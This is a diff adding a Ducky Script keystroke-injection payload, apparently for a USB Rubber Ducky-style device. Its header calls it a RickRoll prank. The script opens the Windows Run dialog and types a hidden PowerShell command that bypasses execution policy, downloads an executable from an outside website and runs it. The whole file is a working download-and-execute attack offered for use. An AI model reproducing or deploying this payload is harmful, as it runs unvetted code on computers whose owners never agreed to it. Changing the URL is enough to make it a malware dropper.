@@ -1,0 +1,15 @@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @ By: Milis                                                                 @
+REM @ Description:                                                              @
+REM @ This payload simulates pressing Win + R to open the Run dialog,           @
+REM @ then executes a PowerShell command to download and run the RickRoll .exe  @
+REM @ from https://www.bestwebsite.ca/files/RickRoll.exe.                       @
+REM @ The PowerShell window will be hidden.                                     @
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest 'https://www.bestwebsite.ca/files/RickRoll.exe' -OutFile 'C:\\Users\\%USERNAME%\\Downloads\\RickRoll.exe'; Start-Process 'C:\\Users\\%USERNAME%\\Downloads\\RickRoll.exe'"
+DELAY 500
+ENTER
